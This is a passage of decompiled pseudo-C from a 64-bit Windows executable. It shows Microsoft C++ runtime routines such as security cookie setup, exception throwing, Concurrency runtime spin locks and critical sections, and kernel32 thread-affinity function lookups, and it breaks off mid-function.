  *a1 = off_13F189C90;
  return a1;
}
// 13F189C90: using guessed type __int64 (__fastcall *off_13F189C90[2])();

//----- (000000013F141428) ----------------------------------------------------
void __noreturn sub_13F141428()
{
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  sub_13F109748(pExceptionObject);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
}
// 13F141428: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F141448) ----------------------------------------------------
void __noreturn sub_13F141448()
{
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  sub_13F141408(pExceptionObject);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVbad_array_new_length_std__);
}
// 13F141448: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F141468) ----------------------------------------------------
__int64 sub_13F141468()
{
  return 0i64;
}

//----- (000000013F141474) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
uintptr_t sub_13F141474()
{
  uintptr_t v0; // rax
  uintptr_t result; // rax
  unsigned __int64 v2; // [rsp+30h] [rbp+10h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp+18h] BYREF
  __int64 v4; // [rsp+40h] [rbp+20h] BYREF

  v0 = _security_cookie;
  if ( _security_cookie == 0x2B992DDFA232i64 )
  {
    v3 = 0i64;
    MEMORY[0x76F833E0](&v3);
    v2 = v3;
    v2 ^= (unsigned int)MEMORY[0x76F83380]();
    v2 ^= (unsigned int)MEMORY[0x76F84EF0]();
    MEMORY[0x76F859A0](&v4);
    v0 = ((unsigned __int64)&v2 ^ v2 ^ v4 ^ ((unsigned __int64)(unsigned int)v4 << 32)) & 0xFFFFFFFFFFFFi64;
    if ( v0 == 0x2B992DDFA232i64 )
      v0 = 0x2B992DDFA233i64;
    _security_cookie = v0;
  }
  result = ~v0;
  qword_13F1B7188 = result;
  return result;
}
// 13F141504: write access to const memory at 13F1B7190 has been detected
// 13F141513: write access to const memory at 13F1B7188 has been detected
// 13F1B7188: using guessed type __int64 qword_13F1B7188;

//----- (000000013F141520) ----------------------------------------------------
__int64 sub_13F141520()
{
  return 0x4000i64;
}

//----- (000000013F141528) ----------------------------------------------------
__int64 *sub_13F141528()
{
  return &qword_13F1C5D00;
}
// 13F1C5D00: using guessed type __int64 qword_13F1C5D00;

//----- (000000013F141530) ----------------------------------------------------
__int64 *sub_13F141530()
{
  __int64 *v0; // rax
  __int64 *result; // rax

  v0 = sub_13F1013F0();
  *v0 |= 4ui64;
  result = sub_13F141528();
  *result |= 2ui64;
  return result;
}

//----- (000000013F14154C) ----------------------------------------------------
__int64 sub_13F14154C()
{
  return 0i64;
}

//----- (000000013F141558) ----------------------------------------------------
__int64 *sub_13F141558()
{
  return &qword_13F1CA188;
}
// 13F1CA188: using guessed type __int64 qword_13F1CA188;

//----- (000000013F141560) ----------------------------------------------------
__int64 *sub_13F141560()
{
  return &qword_13F1CA180;
}
// 13F1CA180: using guessed type __int64 qword_13F1CA180;

//----- (000000013F141568) ----------------------------------------------------
void sub_13F141568()
{
  void (**i)(void); // rbx

  for ( i = (void (**)(void))qword_13F1A77C0; i < (void (**)(void))qword_13F1A77C0; ++i )
  {
    if ( *i )
      (*i)();
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1A77C0: using guessed type __int64 qword_13F1A77C0[2];

//----- (000000013F1415A4) ----------------------------------------------------
void sub_13F1415A4()
{
  void (**i)(void); // rbx

  for ( i = (void (**)(void))&qword_13F1A77D0; i < (void (**)(void))&qword_13F1A77D0; ++i )
  {
    if ( *i )
      (*i)();
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1A77D0: using guessed type __int64 qword_13F1A77D0;

//----- (000000013F1415E0) ----------------------------------------------------
__int64 __fastcall sub_13F1415E0(__int64 a1, int a2)
{
  __int64 *v2; // rsi
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 pExceptionObject[3]; // [rsp+40h] [rbp-38h] BYREF
  __int64 v9[3]; // [rsp+58h] [rbp-20h] BYREF

  *(_QWORD *)(a1 + 8) = 0i64;
  v2 = (__int64 *)(a1 + 24);
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_DWORD *)(a1 + 16) = 1;
  *(_DWORD *)(a1 + 32) = 0;
  *(_DWORD *)(a1 + 36) = 0;
  *(_QWORD *)a1 = sub_13F1490A8();
  if ( a2 != -1 )
  {
    if ( (int)sub_13F1454C0() < 3 )
    {
      v6 = sub_13F14CC50();
      if ( !(unsigned int)sub_13F142348(v2, v6, sub_13F141900, a1, a2, 0, 32) )
      {
        sub_13F109748(v9);
        CxxThrowException(v9, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
      }
    }
    else
    {
      v5 = sub_13F142A78();
      *v2 = v5;
      if ( !v5 )
      {
        sub_13F109748(pExceptionObject);
        CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
      }
    }
  }
  return a1;
}
// 13F142348: using guessed type __int64 __fastcall sub_13F142348(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD, _DWORD);
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);
// 13F1B71D4: using guessed type int dword_13F1B71D4;
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;
// 13F1415E0: using guessed type _QWORD pExceptionObject[3];
// 13F1415E0: using guessed type _QWORD var_20[3];

//----- (000000013F1416E8) ----------------------------------------------------
__int64 __fastcall sub_13F1416E8(__int64 a1)
{
  sub_13F1426B0();
  return a1;
}
// 13F1B71C0: using guessed type int dword_13F1B71C0;

//----- (000000013F141708) ----------------------------------------------------
_DWORD *__fastcall sub_13F141708(_DWORD *a1)
{
  _DWORD *result; // rax

  *a1 = 0;
  result = a1;
  a1[1] = 0;
  return result;
}

//----- (000000013F14171C) ----------------------------------------------------
__int64 __fastcall sub_13F14171C(__int64 a1)
{
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_QWORD *)a1 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_DWORD *)(a1 + 16) = 2;
  *(_DWORD *)(a1 + 32) = 0;
  *(_DWORD *)(a1 + 36) = 0;
  return a1;
}

//----- (000000013F141744) ----------------------------------------------------
_QWORD *__fastcall sub_13F141744(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = &Concurrency::improper_lock::`vftable';
  return a1;
}
// 13F189D10: using guessed type void *Concurrency::improper_lock::`vftable';

//----- (000000013F141784) ----------------------------------------------------
__int64 *__fastcall sub_13F141784(__int64 *a1, __int64 a2)
{
  *a1 = a2;
  sub_13F1415E0((__int64)(a1 + 1), -1);
  sub_13F141A5C(*a1, (__int64)(a1 + 1), 1);
  return a1;
}

//----- (000000013F1417C8) ----------------------------------------------------
char __fastcall sub_13F1417C8(__int64 *a1)
{
  return sub_13F141FB8(*a1);
}

//----- (000000013F1417E4) ----------------------------------------------------
__int64 __fastcall sub_13F1417E4(__int64 a1, __int64 a2)
{
  unsigned int v2; // edi
  int v4; // ecx
  unsigned int v5; // eax
  unsigned int v6; // eax
  int v8[2]; // [rsp+20h] [rbp-28h] BYREF
  int v9; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v10)(); // [rsp+30h] [rbp-18h]

  v2 = a2;
  v4 = sub_13F1454C8(a1, a2);
  if ( (*(_DWORD *)(a1 + 16) & 4) == 0 )
  {
    v5 = (*(_DWORD *)(a1 + 16) & 2) != 0 ? (*(_DWORD *)(a1 + 16) >> 3) - (v2 >> 3) : 1;
    if ( v5 <= v4 + 2 )
    {
      v10 = sub_13F142C6C;
      v6 = 4000 * (v5 - 1) / (v4 + 2) + 4000;
      if ( v6 )
      {
        v8[1] = 0;
        v8[0] = v6;
        v9 = 1;
      }
      else
      {
        v9 = 4;
      }
      while ( (*(_DWORD *)(a1 + 16) & 1) != 0 && sub_13F141CA8(v8) )
        ;
    }
  }
  return sub_13F142E90();
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F1454C8: using guessed type __int64 __fastcall sub_13F1454C8(_QWORD, _QWORD);
// 13F1B71C0: using guessed type int dword_13F1B71C0;

//----- (000000013F141894) ----------------------------------------------------
__int64 __fastcall sub_13F141894(__int64 a1, volatile signed __int32 *a2)
{
  if ( _InterlockedCompareExchange(a2 + 8, 2, 0) )
  {
    if ( *((_QWORD *)a2 + 3) && _InterlockedIncrement(a2 + 9) == 2 )
      sub_13F14088C(a2, 40i64);
  }
  else
  {
    (*(void (__fastcall **)(_QWORD))(**(_QWORD **)a2 + 24i64))(*(_QWORD *)a2);
  }
  return sub_13F142B40();
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F141900) ----------------------------------------------------
__int64 __fastcall sub_13F141900(volatile signed __int32 *a1)
{
  __int64 v2; // rax
  __int64 result; // rax

  v2 = sub_13F14CC50();
  sub_13F142350(v2, *((_QWORD *)a1 + 3), 0i64);
  result = (unsigned int)_InterlockedCompareExchange(a1 + 8, 2, 0);
  if ( !(_DWORD)result )
    return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)a1 + 24i64))(*(_QWORD *)a1);
  if ( *((_QWORD *)a1 + 3) )
  {
    result = (unsigned int)_InterlockedIncrement(a1 + 9);
    if ( (_DWORD)result == 2 )
      return sub_13F14088C(a1, 40i64);
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14196C) ----------------------------------------------------
__int64 __fastcall sub_13F14196C(__int64 a1, _QWORD *a2)
{
  __int64 result; // rax
  unsigned int v4; // ebx

  result = *(_DWORD *)(a1 + 16) >> 1;
  if ( (*(_DWORD *)(a1 + 16) & 2) == 0 )
  {
    result = *((_DWORD *)a2 + 4) >> 1;
    if ( (a2[2] & 2) != 0 )
    {
      v4 = (*((_DWORD *)a2 + 4) + 8) & 0xFFFFFFFA;
      if ( (a2[2] & 1) != 0
        && ((a2[2] & 4) != 0 || !a2[3] && (*(unsigned __int8 (__fastcall **)(_QWORD))(*(_QWORD *)*a2 + 32i64))(*a2)) )
      {
        v4 |= 4u;
      }
      result = v4 | *(_DWORD *)(a1 + 16);
      *(_DWORD *)(a1 + 16) = result;
    }
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1419E0) ----------------------------------------------------
__int64 __fastcall sub_13F1419E0(__int64 a1)
{
  __int64 result; // rax
  volatile signed __int32 v3; // ett

  while ( 1 )
  {
    if ( *(int *)(a1 + 4) > 0 )
      sub_13F141DE8((_DWORD *)(a1 + 4), 0, 0xFFFFFFFF);
    if ( *(_DWORD *)a1 != -1 )
    {
      v3 = *(_DWORD *)a1;
      result = (unsigned int)_InterlockedCompareExchange(
                               (volatile signed __int32 *)a1,
                               *(_DWORD *)a1 + 1,
                               *(_DWORD *)a1);
      if ( v3 == (_DWORD)result )
        break;
    }
  }
  return result;
}

//----- (000000013F141A20) ----------------------------------------------------
__int64 __fastcall sub_13F141A20(volatile signed __int32 *a1)
{
  __int64 result; // rax

  _InterlockedIncrement(a1 + 1);
  for ( result = (unsigned int)_InterlockedCompareExchange(a1, -1, 0);
        (_DWORD)result;
        result = (unsigned int)_InterlockedCompareExchange(a1, -1, 0) )
  {
    sub_13F141DE8(a1, 0, 0xFFFFFFFF);
  }
  return result;
}

//----- (000000013F141A5C) ----------------------------------------------------
bool __fastcall sub_13F141A5C(__int64 a1, __int64 a2, char a3)
{
  _QWORD *v6; // rsi
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( *(_QWORD *)a2 == *(_QWORD *)a1 )
  {
    sub_13F142CCC(pExceptionObject, (__int64)"Lock already taken");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_lock_Concurrency__);
  }
  v6 = (_QWORD *)_InterlockedExchange64((volatile __int64 *)(a1 + 48), a2);
  if ( v6 )
  {
    sub_13F14196C(a2, v6);
    v6[1] = a2;
    sub_13F1417E4(a2, *(unsigned int *)(a1 + 16));
    if ( *(_DWORD *)(a2 + 32) != 2 )
      sub_13F14196C(a2, (_QWORD *)a1);
  }
  else
  {
    *(_QWORD *)(a1 + 40) = a2;
    sub_13F14196C(a2, (_QWORD *)a1);
    *(_DWORD *)(a2 + 16) &= ~1u;
    if ( *(_QWORD *)(a2 + 24) )
    {
      if ( _InterlockedExchange((volatile __int32 *)(a2 + 32), 1) == 2 )
      {
        sub_13F142E90();
        if ( *(_QWORD *)(a2 + 24) )
        {
          if ( _InterlockedIncrement((volatile signed __int32 *)(a2 + 36)) == 2 )
            sub_13F14088C(a2, 40i64);
        }
      }
    }
  }
  if ( a3 )
  {
    *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
    *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
    *(_QWORD *)a1 = *(_QWORD *)a2;
    *(_QWORD *)(a1 + 40) = a2;
  }
  return *(_DWORD *)(a2 + 32) != 2;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F141A5C: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F141B70) ----------------------------------------------------
__int64 __fastcall sub_13F141B70(__int64 a1)
{
  _DWORD *v1; // rcx
  __int64 result; // rax

  v1 = (_DWORD *)(a1 + 4);
  result = (unsigned int)*v1;
  if ( (int)result > 0 )
    return sub_13F141DE8(v1, 0, 0xFFFFFFFF);
  return result;
}

//----- (000000013F141B90) ----------------------------------------------------
char __fastcall sub_13F141B90(__int64 a1)
{
  __int64 v1; // rax

  v1 = *(_QWORD *)(a1 + 48);
  if ( v1 )
  {
    sub_13F141E5C(a1);
    LOBYTE(v1) = sub_13F141FB8(a1);
  }
  return v1;
}

//----- (000000013F141BB8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F141BB8(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  result = (unsigned int)sub_13F1454C8(a1, a2) > 1 ? 0xFA0 : 0;
  dword_13F1B71C0 = result;
  return result;
}
// 13F141BCF: write access to const memory at 13F1B71C0 has been detected
// 13F1454C8: using guessed type __int64 __fastcall sub_13F1454C8(_QWORD, _QWORD);
// 13F1B71C0: using guessed type int dword_13F1B71C0;

//----- (000000013F141BE4) ----------------------------------------------------
void __fastcall sub_13F141BE4(volatile signed __int32 *a1)
{
  _InterlockedDecrement(a1);
}

//----- (000000013F141BE8) ----------------------------------------------------
void __fastcall sub_13F141BE8(__int64 a1)
{
  *(_DWORD *)a1 = 0;
  _InterlockedDecrement((volatile signed __int32 *)(a1 + 4));
}

//----- (000000013F141BF4) ----------------------------------------------------
char __fastcall sub_13F141BF4(__int64 a1)
{
  int i; // ecx
  int v3; // ecx
  __int64 v4; // rcx
  __int64 v5; // rcx
  bool v7; // zf

  for ( i = *(_DWORD *)(a1 + 8); !i; i = 1 )
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_DWORD *)a1 = 4000;
    *(_DWORD *)(a1 + 4) = 1;
    *(_DWORD *)(a1 + 8) = 1;
  }
  v3 = i - 1;
  if ( !v3 )
  {
    _mm_pause();
    v7 = (*(_DWORD *)a1)-- == 1;
    if ( v7 )
      *(_DWORD *)(a1 + 8) = 3 - (*(_DWORD *)(a1 + 4) != 0);
    return 1;
  }
  v4 = (unsigned int)(v3 - 1);
  if ( !(_DWORD)v4 )
  {
    v7 = (*(_DWORD *)(a1 + 4))-- == 1;
    if ( v7 )
      *(_DWORD *)(a1 + 8) = 3;
    (*(void (__fastcall **)(__int64, __int64, __int64))(a1 + 16))(v4, a1, 4i64);
    return 1;
  }
  v5 = (unsigned int)(v4 - 1);
  if ( (_DWORD)v5 )
  {
    if ( (_DWORD)v5 == 1 )
      (*(void (__fastcall **)(__int64, __int64, __int64))(a1 + 16))(v5, a1, 4i64);
  }
  else
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_DWORD *)a1 = 4000;
    *(_DWORD *)(a1 + 4) = 1;
    *(_DWORD *)(a1 + 8) = 1;
  }
  return 0;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1B71C0: using guessed type int dword_13F1B71C0;

//----- (000000013F141CA8) ----------------------------------------------------
char __fastcall sub_13F141CA8(_DWORD *a1)
{
  char v1; // dl
  int i; // ecx
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  bool v8; // zf

  v1 = 0;
  for ( i = a1[2]; !i; i = 1 )
  {
    a1[2] = 0;
    *a1 = 4000;
    a1[1] = 0;
    a1[2] = 1;
  }
  v4 = i - 1;
  if ( v4 )
  {
    v5 = v4 - 1;
    if ( v5 )
    {
      v6 = v5 - 1;
      if ( !v6 )
      {
        a1[2] = 0;
        *a1 = 4000;
        a1[1] = 0;
        a1[2] = 1;
        return 0;
      }
      if ( v6 != 1 )
        return 0;
    }
    else
    {
      v8 = a1[1]-- == 1;
      if ( v8 )
        a1[2] = 3;
      v1 = 1;
    }
    _mm_pause();
    return v1;
  }
  else
  {
    _mm_pause();
    v8 = (*a1)-- == 1;
    if ( v8 )
      a1[2] = 3 - (a1[1] != 0);
    return 1;
  }
}
// 13F1B71C0: using guessed type int dword_13F1B71C0;

//----- (000000013F141D48) ----------------------------------------------------
signed __int64 __fastcall sub_13F141D48(signed __int64 a1, signed __int64 a2)
{
  signed __int64 result; // rax
  __int64 v5; // rax
  char v6[8]; // [rsp+20h] [rbp-28h] BYREF
  int v7; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v8)(); // [rsp+30h] [rbp-18h]

  *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
  *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
  *(_QWORD *)a1 = *(_QWORD *)a2;
  result = *(_QWORD *)(a1 + 8);
  if ( !result )
  {
    result = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 48), a1, a2);
    if ( a2 != result )
    {
      v5 = *(_QWORD *)(a2 + 8);
      v7 = 0;
      v8 = sub_13F142C6C;
      while ( !v5 )
      {
        sub_13F141BF4((__int64)v6);
        v5 = *(_QWORD *)(a2 + 8);
      }
      *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
      *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
      result = *(_QWORD *)a2;
      *(_QWORD *)a1 = *(_QWORD *)a2;
    }
  }
  *(_QWORD *)(a1 + 40) = a1;
  return result;
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F141D48: using guessed type char var_28[8];

//----- (000000013F141DD0) ----------------------------------------------------
char __fastcall sub_13F141DD0(volatile signed __int32 *a1)
{
  if ( _InterlockedCompareExchange(a1, -1, 0) )
    return 0;
  _InterlockedIncrement(a1 + 1);
  return 1;
}

//----- (000000013F141DE8) ----------------------------------------------------
__int64 __fastcall sub_13F141DE8(_DWORD *a1, int a2, unsigned int a3)
{
  int v3; // er9
  __int64 result; // rax
  int i; // ebx
  int v9; // eax

  v3 = 0;
  result = a3 & *a1;
  for ( i = 10; (_DWORD)result != a2; result = a3 & *a1 )
  {
    _mm_pause();
    if ( (unsigned int)++v3 >= 0xFA0 )
    {
      sub_13F1427BC(i <= 0);
      v9 = i - 1;
      v3 = 0;
      if ( i <= 0 )
        v9 = i;
      i = v9;
    }
  }
  return result;
}
// 13F1427BC: using guessed type __int64 __fastcall sub_13F1427BC(_QWORD);
// 13F1B71C0: using guessed type int dword_13F1B71C0;

//----- (000000013F141E5C) ----------------------------------------------------
signed __int64 __fastcall sub_13F141E5C(__int64 a1)
{
  char v3[56]; // [rsp+20h] [rbp-38h] BYREF

  sub_13F1415E0((__int64)v3, -1);
  sub_13F141A5C(a1, (__int64)v3, 0);
  return sub_13F141D48(a1, (signed __int64)v3);
}

//----- (000000013F141E98) ----------------------------------------------------
char __fastcall sub_13F141E98(signed __int64 a1)
{
  char v3[16]; // [rsp+20h] [rbp-38h] BYREF
  int v4; // [rsp+30h] [rbp-28h]

  sub_13F1415E0((__int64)v3, -1);
  if ( _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 48), (signed __int64)v3, 0i64) )
    return 0;
  *(_QWORD *)(a1 + 40) = v3;
  sub_13F14196C((__int64)v3, (_QWORD *)a1);
  v4 &= ~1u;
  sub_13F141D48(a1, (signed __int64)v3);
  return 1;
}

//----- (000000013F141EF8) ----------------------------------------------------
char __fastcall sub_13F141EF8(signed __int64 a1, int a2)
{
  __int64 v4; // rax
  __int64 v5; // rbx

  v4 = sub_13F14059C(40i64);
  if ( v4 )
    v5 = sub_13F1415E0(v4, a2);
  else
    v5 = 0i64;
  if ( sub_13F141A5C(a1, v5, 0) )
  {
    sub_13F141D48(a1, v5);
    if ( *(_QWORD *)(v5 + 24) )
    {
      if ( _InterlockedIncrement((volatile signed __int32 *)(v5 + 36)) == 2 )
        sub_13F14088C(v5, 40i64);
    }
    return 1;
  }
  else
  {
    if ( *(_QWORD *)(v5 + 24) && _InterlockedIncrement((volatile signed __int32 *)(v5 + 36)) == 2 )
      sub_13F14088C(v5, 40i64);
    return 0;
  }
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F141FB8) ----------------------------------------------------
char __fastcall sub_13F141FB8(__int64 a1)
{
  signed __int64 v1; // rsi
  signed __int64 v3; // rbx
  signed __int64 v4; // rax
  signed __int64 *v5; // r14
  signed __int64 v6; // rsi
  __int64 v7; // rcx
  char v9[8]; // [rsp+20h] [rbp-48h] BYREF
  int v10; // [rsp+28h] [rbp-40h]
  __int64 (__fastcall *v11)(); // [rsp+30h] [rbp-38h]
  char v12[8]; // [rsp+38h] [rbp-30h] BYREF
  int v13; // [rsp+40h] [rbp-28h]
  __int64 (__fastcall *v14)(); // [rsp+48h] [rbp-20h]

  v1 = *(_QWORD *)(a1 + 40);
  *(_QWORD *)a1 = 0i64;
  v3 = *(_QWORD *)(v1 + 8);
  *(_QWORD *)(a1 + 40) = v3;
  if ( v3 )
  {
LABEL_7:
    while ( 1 )
    {
      LODWORD(v4) = _InterlockedCompareExchange((volatile signed __int32 *)(v3 + 32), 1, 0);
      if ( !(_DWORD)v4 )
        break;
      v5 = (signed __int64 *)(v3 + 8);
      v6 = v3;
      v3 = *(_QWORD *)(v3 + 8);
      *(_QWORD *)(a1 + 40) = v3;
      if ( !v3 )
      {
        v4 = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 48), 0i64, v6);
        if ( v6 != v4 )
        {
          v3 = *v5;
          v13 = 0;
          v14 = sub_13F142C6C;
          while ( !v3 )
          {
            LOBYTE(v4) = sub_13F141BF4((__int64)v12);
            v3 = *v5;
          }
          *(_QWORD *)(a1 + 40) = v3;
        }
      }
      if ( *(_QWORD *)(v6 + 24) )
      {
        LODWORD(v4) = _InterlockedIncrement((volatile signed __int32 *)(v6 + 36));
        if ( (_DWORD)v4 == 2 )
          LOBYTE(v4) = sub_13F14088C(v6, 40i64);
      }
      if ( !v3 )
        return v4;
    }
    v7 = *(_QWORD *)v3;
    *(_DWORD *)(v3 + 16) &= ~1u;
    LOBYTE(v4) = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 24i64))(v7);
  }
  else
  {
    v4 = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 48), 0i64, v1);
    if ( v1 != v4 )
    {
      v3 = *(_QWORD *)(v1 + 8);
      v10 = 0;
      v11 = sub_13F142C6C;
      while ( !v3 )
      {
        sub_13F141BF4((__int64)v9);
        v3 = *(_QWORD *)(v1 + 8);
      }
      *(_QWORD *)(a1 + 40) = v3;
      goto LABEL_7;
    }
  }
  return v4;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F141FB8: using guessed type char var_48[8];
// 13F141FB8: using guessed type char var_30[8];

//----- (000000013F1420DC) ----------------------------------------------------
__int64 __fastcall sub_13F1420DC(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C(a2 + 8, a1 + 8);
  *(_QWORD *)a1 = &Concurrency::scheduler_resource_allocation_error::`vftable';
  *(_DWORD *)(a1 + 24) = *(_DWORD *)(a2 + 24);
  return a1;
}
// 13F189D40: using guessed type void *Concurrency::scheduler_resource_allocation_error::`vftable';

//----- (000000013F14212C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void sub_13F14212C()
{
  ;
}
// 13F142184: write access to const memory at 13F1C5D28 has been detected
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1417C0: using guessed type __int64 __fastcall sub_13F1417C0(_QWORD);
// 13F1C5D28: using guessed type __int64 qword_13F1C5D28;

//----- (000000013F142194) ----------------------------------------------------
_QWORD *__fastcall sub_13F142194(_QWORD *a1, char a2)
{
  *a1 = &std::exception::`vftable';
  sub_13F15E4FC((__int64)(a1 + 1));
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 32i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1421D8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
unsigned __int64 sub_13F1421D8()
{
  __int64 v0; // rbx
  __int64 v1; // rdi
  __int64 v2; // rax
  __int64 v3; // rbx
  __int64 v4; // rax
  __int64 v5; // rax
  unsigned __int64 result; // rax
  int v7; // eax
  int v8; // edx
  int v9; // eax
  int v10; // edx
  char pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF

  v0 = MEMORY[0x76F920C0](L"kernel32.dll");
  v1 = MEMORY[0x76F92020](v0, "SetThreadGroupAffinity");
  v2 = MEMORY[0x76F92020](v0, "GetThreadGroupAffinity");
  v3 = v2;
  if ( !v1 || !v2 )
  {
    v7 = MEMORY[0x76F91760]();
    v8 = (unsigned __int16)v7 | 0x80070000;
    if ( v7 <= 0 )
      v8 = v7;
    sub_13F142E40((__int64)pExceptionObject, v8);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5D18 = sub_13F142890(v1);
  qword_13F1C5D20 = sub_13F142890(v3);
  v4 = MEMORY[0x76F920C0](L"kernel32.dll");
  v5 = MEMORY[0x76F92020](v4, "GetCurrentProcessorNumberEx");
  if ( !v5 )
  {
    v9 = MEMORY[0x76F91760]();
    v10 = (unsigned __int16)v9 | 0x80070000;
    if ( v9 <= 0 )
      v10 = v9;
    sub_13F142E40((__int64)pExceptionObject, v10);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  result = sub_13F142890(v5);
  qword_13F1C5D10 = result;
  return result;
}
// 13F14222D: write access to const memory at 13F1C5D18 has been detected
// 13F142240: write access to const memory at 13F1C5D20 has been detected
// 13F14226F: write access to const memory at 13F1C5D10 has been detected
// 13F181660: using guessed type wchar_t aKernel32Dll[13];
// 13F1C5D10: using guessed type __int64 qword_13F1C5D10;
// 13F1C5D18: using guessed type __int64 qword_13F1C5D18;
// 13F1C5D20: using guessed type __int64 qword_13F1C5D20;

//----- (000000013F1422EC) ----------------------------------------------------
__int64 __fastcall sub_13F1422EC()
{
  __int64 result; // rax
  int v1; // eax
  int v2; // edx
  char pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF

  result = sub_13F10A93C();
  if ( !result )
  {
    v1 = MEMORY[0x76F91760]();
    v2 = (unsigned __int16)v1 | 0x80070000;
    if ( v1 <= 0 )
      v2 = v1;
    sub_13F142E40((__int64)pExceptionObject, v2);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}

//----- (000000013F142350) ----------------------------------------------------
__int64 __fastcall sub_13F142350(__int64 a1, __int64 a2, __int64 a3)
{
  int i; // ebx
  __int64 result; // rax

  for ( i = 16; i > 0; --i )
  {
    result = MEMORY[0x76F786B0](a1, a2, a3);
    if ( (_DWORD)result )
      break;
    result = MEMORY[0x76F91760]();
    if ( (_DWORD)result == 997 )
      break;
  }
  return result;
}

//----- (000000013F1423B0) ----------------------------------------------------
__int64 __fastcall sub_13F1423B0(__int64 a1)
{
  __int64 (__fastcall *v2)(__int64); // rax

  v2 = (__int64 (__fastcall *)(__int64))sub_13F142890(0i64);
  return v2(a1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5D10: using guessed type __int64 qword_13F1C5D10;

//----- (000000013F1423D4) ----------------------------------------------------
__int64 __fastcall sub_13F1423D4(unsigned int *a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  int v5; // eax
  int v6; // edx
  int v7; // eax
